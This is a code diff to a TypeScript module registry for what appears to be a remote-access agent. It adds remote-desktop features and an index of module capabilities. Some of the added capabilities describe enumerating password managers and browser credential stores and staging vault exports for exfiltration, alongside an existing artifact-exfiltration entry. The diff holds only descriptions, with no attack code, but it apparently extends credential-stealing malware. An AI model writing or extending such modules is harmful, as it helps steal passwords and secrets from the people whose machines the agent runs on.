@@ -32,6 +32,24 @@ export const agentModules: AgentModuleDefinition[] = [
         description:
           "Relay keyboard and pointer events back to the remote host.",
       },
+      {
+        id: "remote-desktop.transport.quic",
+        name: "QUIC transport",
+        description:
+          "Provide QUIC transport negotiation for resilient input streams.",
+      },
+      {
+        id: "remote-desktop.codec.hevc",
+        name: "HEVC encoding",
+        description:
+          "Enable hardware-accelerated HEVC streaming when supported.",
+      },
+      {
+        id: "remote-desktop.metrics",
+        name: "Performance telemetry",
+        description:
+          "Collect frame quality and adaptive bitrate metrics for dashboards.",
+      },
     ],
   },
   {
@@ -93,6 +111,12 @@ export const agentModules: AgentModuleDefinition[] = [
         description:
           "Collect artifacts staged by upstream modules for exfiltration.",
       },
+      {
+        id: "vault.export",
+        name: "Vault export collection",
+        description:
+          "Stage and exfiltrate vault exports via the recovery pipeline.",
+      },
     ],
   },
   {
@@ -135,6 +159,12 @@ export const agentModules: AgentModuleDefinition[] = [
         description:
           "Surface live telemetry metrics used by scheduling and recovery modules.",
       },
+      {
+        id: "vault.enumerate",
+        name: "Vault enumeration",
+        description:
+          "Enumerate installed password managers and browser credential stores.",
+      },
     ],
   },
   {
@@ -159,4 +189,33 @@ export const agentModuleIndex: ReadonlyMap<string, AgentModuleDefinition> =
 
 export const agentModuleIds: ReadonlySet<string> = new Set(
   agentModules.map((module) => module.id),
+);
+
+type AgentModuleCapabilityRecord = AgentModuleCapability & {
+  moduleId: string;
+  moduleTitle: string;
+};
+
+const capabilityEntries: [string, AgentModuleCapabilityRecord][] = [];
+
+for (const module of agentModules) {
+  for (const capability of module.capabilities) {
+    capabilityEntries.push([
+      capability.id,
+      {
+        ...capability,
+        moduleId: module.id,
+        moduleTitle: module.title,
+      },
+    ]);
+  }
+}
+
+export const agentModuleCapabilityIndex: ReadonlyMap<
+  string,
+  AgentModuleCapabilityRecord
+> = new Map(capabilityEntries);
+
+export const agentModuleCapabilityIds: ReadonlySet<string> = new Set(
+  capabilityEntries.map(([id]) => id),
 );
